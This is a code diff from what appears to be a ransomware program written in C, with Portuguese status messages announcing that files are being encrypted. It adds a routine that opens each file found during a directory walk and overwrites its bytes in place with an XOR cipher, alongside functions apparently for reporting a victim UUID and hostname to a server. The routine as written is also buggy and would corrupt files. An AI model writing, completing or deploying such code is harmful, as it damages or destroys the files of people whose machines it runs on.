@@ -54,7 +54,7 @@ void WhatIsDir(char *dir_sch){
 
 			printf("[CRIPTOGRAFANDO ARQUIVO]:  %s\n", file_name);
 
-			encryptfile(file_path);
+			encryptfile(file_name);
 		}
 	}
 
@@ -93,7 +93,28 @@ void connectserver(char *uuid, char *hostname){
 }
 
 void encryptfile(char *file_to_encrypt){
-	//int len = sizeof(getdir->d_name);
+	//NOTE: the bin file must be one level
+	//			above the directory tree of the target directory
+	
+	FILE *to_encrypt;
+	char buff;
+
+	to_encrypt = fopen(file_to_encrypt, "r+");
+
+	do {
+		char xor;
+
+		buff = fgetc(to_encrypt);
+		xor = buff ^ 'z';
+
+		fputc(xor, to_encrypt);
+
+		if(feof(to_encrypt))
+			break;
+
+	} while(1);
+	
+	fclose(to_encrypt);
 }
 
 char *getuuid(void){
